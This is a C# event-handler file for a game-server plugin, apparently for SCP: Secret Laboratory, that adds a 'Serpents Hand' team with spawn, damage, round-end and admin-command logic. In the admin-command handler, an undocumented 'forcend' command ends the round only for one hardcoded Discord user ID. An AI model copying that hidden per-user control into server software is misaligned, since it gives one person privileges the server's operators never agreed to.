using System;
using System.Collections.Generic;
using System.Linq;
using Qurre;
using Qurre.API;
using Qurre.API.Events;
using MEC;
using Respawning;
using UnityEngine;
using Qurre.API.Controllers;

namespace SerpentsHand
{
	public class EventHandlers
	{
		CoroutineHandle handle;
		public static bool isSpawnable { get; set; } = false;
		public void OnRoundStart()
		{
			test = false;
			shPlayers.Clear();
			shPocketPlayers.Clear();
			respawnCount = 0;
			if (handle.IsRunning) Timing.KillCoroutines(handle);
			handle = Timing.RunCoroutine(CheckTime());
		}
		Dictionary<int,bool> roundtick { get; set; } = new Dictionary<int, bool>();
		int count { get; set; } = -1;

		internal bool checkedspawn = false;

		public IEnumerator<float> CheckTime()
        {
			for(; ;)
            {
				if(IsSpawning && !isSpawnable&&!roundtick.ContainsKey(count+1)&&!checkedspawn)
                {
					checkedspawn = true;
					count++;
					 isSpawnable=rand.Next(1, 101) <= SerpentsHand.instance.cfg.SpawnChance && Player.List.Count() > 0 && respawnCount >= SerpentsHand.instance.cfg.RespawnDelay;

				}
				yield return Timing.WaitForSeconds(1f);
            }
        }

		public static bool IsSpawning => RespawnManager.Singleton._curSequence == RespawnManager.RespawnSequencePhase.PlayingEntryAnimations || RespawnManager.Singleton._curSequence == RespawnManager.RespawnSequencePhase.SpawningSelectedTeam;
		public void OnTeamRespawn(TeamRespawnEvent ev)
		{
			checkedspawn=false;
			if (ev.NextKnownTeam == SpawnableTeamType.ChaosInsurgency)
			{
				if (isSpawnable)
				{
						List<Player> SHPlayers = new List<Player>();
						List<Player> list = new List<Player>(ev.Players);
						ev.Players.Clear();
						int num = 0;
						while (num < SerpentsHand.instance.cfg.MaxSquad && list.Count > 0)
						{
							Player item = list[rand.Next(list.Count)];
							SHPlayers.Add(item);
							list.Remove(item);
							num++;
						}
						Timing.CallDelayed(0.1f, delegate ()
						{
							SpawnSquad(SHPlayers);
						});
				}
				else
				{
					string ciEntryAnnouncement = SerpentsHand.instance.cfg.CiEntryAnnouncement;
					if (ciEntryAnnouncement != string.Empty)
					{
						Cassie.Send(ciEntryAnnouncement, true, true);
					}
				}
			}
			else isSpawnable = false;
			respawnCount++;
		}

		public void OnPocketDimensionEnter(PocketDimensionEnterEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id))
			{
				shPocketPlayers.Add(ev.Player.Id);
			}
		}

		public void OnSpawn(SpawnEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id))
			{
				ev.Player.ReferenceHub.nicknameSync.CustomPlayerInfo = $"<color=#00FF58>{SerpentsHand.instance.cfg.DisplayedCustomPlayerInfo}</color>";
				ev.Player.ReferenceHub.nicknameSync.ShownPlayerInfo &= ~PlayerInfoArea.Role;
			}
		}

		public void OnPocketDimensionDie(PocketDimensionFailEscapeEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id))
			{
				if (!SerpentsHand.instance.cfg.FriendlyFire)
				{
					ev.Allowed = false;
				}
				if (SerpentsHand.instance.cfg.TeleportTo106)
				{
					TeleportTo106(ev.Player);
				}
				shPocketPlayers.Remove(ev.Player.Id);
			}
		}

		public void OnPocketDimensionExit(PocketDimensionEscapeEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id))
			{
				ev.Allowed = false;
				if (SerpentsHand.instance.cfg.TeleportTo106)
				{
					TeleportTo106(ev.Player);
				}
				shPocketPlayers.Remove(ev.Player.Id);
			}
		}

		public void OnPlayerHurt(DamageEvent ev)
		{
			Player player = null;

			if (((shPlayers.Contains(ev.Target.Id) && (ev.Attacker.Team == Team.SCP || ev.HitInformations.GetDamageType() == DamageTypes.Pocket)) || (shPlayers.Contains(ev.Attacker.Id) && (ev.Target.Team == Team.SCP || (player != null && ev.Target == player))) || (shPlayers.Contains(ev.Target.Id) && shPlayers.Contains(ev.Attacker.Id) && ev.Target != ev.Attacker)) && !SerpentsHand.instance.cfg.FriendlyFire)
			{
				ev.Amount = 0f;
			}
		}
		public void OnPlayerDeath(DiesEvent ev)
		{
			if (shPlayers.Contains(ev.Target.Id))
			{
				ev.Target.ReferenceHub.nicknameSync.CustomPlayerInfo = string.Empty;
				ev.Target.ReferenceHub.nicknameSync.ShownPlayerInfo |= PlayerInfoArea.Role;
				shPlayers.Remove(ev.Target.Id);
			}
			if (ev.Target.Role == RoleType.Scp106 && !SerpentsHand.instance.cfg.FriendlyFire)
			{
				foreach (Player player in from x in Player.List
				where shPocketPlayers.Contains(x.Id)
				select x)
				{
					player.ReferenceHub.playerStats.HurtPlayer(new PlayerStats.HitInfo(50000f, "WORLD", ev.HitInfo.GetDamageType(), player.Id), player.GameObject, false, true);
				}
			}
		}

		public void OnCheckRoundEnd(CheckEvent ev)
		{
			//SerpentsHand.instance.Check035();
			//int checksdas = SerpentsHand.isScp035 ? Api.AllScp035.Count(e => Api.IsScp035(e)):0;
			bool mtfAlive = CountRoles(Team.MTF) > 0;
			bool ChaosAlive = CountRoles(Team.CHI) > 0;
			bool ScpAlive = CountRoles(Team.SCP) > 0 ;
			bool ClassDAlive = CountRoles(Team.CDP) > 0;
			bool ScientisAlive = CountRoles(Team.RSC) > 0;
			bool ShIsAlive = shPlayers.Count > 0;
			//Log.Info(ShIsAlive);
			if (!ShIsAlive)
            {
				return;
            }
			if (ShIsAlive && ((ChaosAlive && !SerpentsHand.instance.cfg.ScpsWinWithChaos) || ClassDAlive || mtfAlive || ScientisAlive))
			{
				ev.RoundEnd = false;
				test = true;
				return;
			}
			if (ShIsAlive && ScpAlive && !mtfAlive && !ClassDAlive && !ScientisAlive)
			{
				if (!SerpentsHand.instance.cfg.ScpsWinWithChaos)
				{
					if (!ChaosAlive)
					{
						ev.LeadingTeam = (RoundSummary.LeadingTeam)2;
						//ev.IsAllowed = true;
						ev.RoundEnd = true;
						Round.End();
						if (SerpentsHand.instance.cfg.EndRoundFriendlyFire)
						{
							GrantFF();
							return;
						}
					}
				}
				else
				{
					ev.LeadingTeam = RoundSummary.LeadingTeam.Anomalies;
					ev.RoundEnd = true;
					if (SerpentsHand.instance.cfg.EndRoundFriendlyFire)
					{
						GrantFF();
						return;
					}
				}
			}
			else if (ShIsAlive && !ScpAlive && !mtfAlive && !ClassDAlive && !ScientisAlive)
			{
				if (SerpentsHand.instance.cfg.EndRoundFriendlyFire)
				{
					GrantFF();
					return;
				}
			}
			else
			{
				test = false;
			}
		}

		public void OnSetRole(RoleChangeEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id) && GetTeam(ev.NewRole) != Team.TUT)
			{
				shPlayers.Remove(ev.Player.Id);
				ev.Player.ReferenceHub.nicknameSync.CustomPlayerInfo = string.Empty;
				ev.Player.ReferenceHub.nicknameSync.ShownPlayerInfo |= PlayerInfoArea.Role;
			}
			Timing.CallDelayed(1f, () =>
			 ev.Player.GodMode = false);
		}

		public void OnShoot(ShootingEvent ev)
		{
			Player player = Player.Get(ev.Target);
			if (player != null && player.Role == RoleType.Scp096 && shPlayers.Contains(ev.Shooter.Id))
			{
				ev.Allowed = false;
			}
		}

		public void OnDisconnect(LeaveEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id))
			{
				shPlayers.Remove(ev.Player.Id);
				ev.Player.ReferenceHub.nicknameSync.CustomPlayerInfo = string.Empty;
				ev.Player.ReferenceHub.nicknameSync.ShownPlayerInfo |= PlayerInfoArea.Role;
			}
		}

		public void OnContain106(ContainEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id) && !SerpentsHand.instance.cfg.FriendlyFire)
			{
				ev.Allowed = false;
			}
		}

		public void OnRACommand(SendingRAEvent ev)
		{
			string a = ev.Name.ToLower().Split(' ')[0];
			if(a=="forcend"&&ev.Player.UserId== "295581341939007489@discord")
			{
				ev.Prefix = a;
				ev.Allowed = false;
				ev.ReplyMessage = "Fofrced";
				Round.End();
            }
			if (!(a == "spawnsh"))
			{

				ev.Prefix = a;
				if (a == "spawnshsquad")
				{
					ev.Success = false;
					if (ev.Args.Count() > 0)
					{
						int size;
						if (!int.TryParse(ev.Args[0], out size))
						{
							ev.ReplyMessage="Error: invalid size.";
							return;
						}
						CreateSquad(size);
					}
					else
					{
						CreateSquad(5);
					}
					Cassie.Send(SerpentsHand.instance.cfg.EntryAnnouncement, true, true);
					ev.ReplyMessage="Spawned squad.";
				}
				return;
			}
			ev.Allowed = false;
			ev.Prefix = a;
			if (ev.Args.Count() <= 0 || ev.Args[0].Length <= 0)
			{
				ev.ReplyMessage="SPAWNSH [Player Name / Player ID]";
				return;
			}
			Player player = Player.Get(ev.Args[0]);
			if (player != null)
			{
				SpawnPlayer(player, true);
				ev.ReplyMessage="Spawned " + player.Nickname + " as Serpents Hand.";
				return;
			}
			ev.ReplyMessage=("Invalid player.");
		}

		public void OnGeneratorInsert(InteractGeneratorEvent ev)
		{
			if (ev.Status != Qurre.API.Objects.GeneratorStatus.TabledEjected) return;
			if (shPlayers.Contains(ev.Player.Id) && !SerpentsHand.instance.cfg.FriendlyFire)
			{
				ev.Allowed = false;
			}
		}

		public void OnFemurEnter(FemurBreakerEnterEvent ev)
		{
			if (shPlayers.Contains(ev.Player.Id) && !SerpentsHand.instance.cfg.FriendlyFire)
			{
				ev.Allowed = false;
			}
		}

		internal static void SpawnPlayer(Player player, bool full = true)
		{
			shPlayers.Add(player.Id);
			player.SetRole(RoleType.Tutorial, true, false);
			Timing.CallDelayed(3f,()=>player.GodMode = false);
			Timing.CallDelayed(0.4f, () => player.Position = shSpawnPos);
			player.ClearBroadcasts();
			player.Broadcast(10, SerpentsHand.instance.cfg.SpawnBroadcast);
			if (full)
			{
				player.Ammo[0] = 250U;
				player.Ammo[1] = 250U;
				player.Ammo[2] = 250U;
				for (int i = 0; i < SerpentsHand.instance.cfg.SpawnItems.Count; i++)
				{
					player.Inventory.AddNewItem((ItemType)SerpentsHand.instance.cfg.SpawnItems[i], -4.65664672E+11f, 0, 0, 0);
				}
				player.HP = SerpentsHand.instance.cfg.Health;
			}
		}

		internal static void CreateSquad(int size)
		{
			List<Player> list = Player.List.Where(player=> player.Team == Team.RIP && !player.Overwatch).ToList();
			int num = 1;
			while (list.Count > 0 && num <= size)
			{
				int index = rand.Next(0, list.Count);
				if (list[index] != null)
				{
					SpawnPlayer(list[index], true);
					list.RemoveAt(index);
					num++;
				}
			}
		}

		internal static void SpawnSquad(List<Player> players)
		{
			foreach (Player player in players)
			{
				SpawnPlayer(player, true);
			}
			Cassie.Send(SerpentsHand.instance.cfg.EntryAnnouncement, true, true);
			foreach (Player pl in from Player x in Player.List where x.Team == Team.SCP select x) pl.ShowHint("Приехала группировка длань змея. Она помогает scp",10);
		}

		internal static void GrantFF()
		{
			foreach (int num in shPlayers)
			{
				Player player = Player.Get(num);
				if (player != null)
				{
					player.FriendlyFire = true;
				}
			}
			foreach (int num2 in SerpentsHand.instance.shPocketPlayers)
			{
				Player player2 = Player.Get(num2);
				if (player2 != null)
				{
					player2.FriendlyFire = true;
				}
			}
			shPlayers.Clear();
			SerpentsHand.instance.shPocketPlayers.Clear();
		}

		private int CountRoles(Team team)
		{


			int num = 0;
			foreach (Player player2 in Player.List)
			{
				if (player2.Team == team )
				{
					num++;
				}
			}
			return num;
		}

		
		private void TeleportTo106(Player player)
		{
			Player player2 = (from x in Player.List
			where x.Role == RoleType.Scp106
			select x).FirstOrDefault<Player>();
			if (player2 != null)
			{
				player.Position = player2.Position;
				return;
			}
			player.Position = Map.GetRandomSpawnPoint(RoleType.Scp096);
		}

		
		private Team GetTeam(RoleType roleType)
		{
			switch (roleType)
			{
			case RoleType.Scp173:
			case RoleType.Scp106:
			case RoleType.Scp049:
			case RoleType.Scp079:
			case RoleType.Scp096:
			case RoleType.Scp0492:
			case RoleType.Scp93953:
			case RoleType.Scp93989:
				return Team.SCP;
			case RoleType.ClassD:
				return Team.CDP;
			case RoleType.Spectator:
				return Team.RIP;
			case RoleType.NtfScientist:
			case RoleType.NtfLieutenant:
			case RoleType.NtfCommander:
			case RoleType.NtfCadet:
			case RoleType.FacilityGuard:
				return Team.MTF;
			case RoleType.Scientist:
				return Team.RSC;
			case RoleType.ChaosInsurgency:
				return Team.CHI;
			case RoleType.Tutorial:
				return Team.TUT;
			default:
				return Team.RIP;
			}
		}

		
		public static List<int> shPlayers = new List<int>();

		private List<int> shPocketPlayers = new List<int>();

		private int respawnCount;

		private bool test;

		private static System.Random rand = new System.Random();

		private static Vector3 shSpawnPos = new Vector3(0f, 1002f, 8f);
	}
}
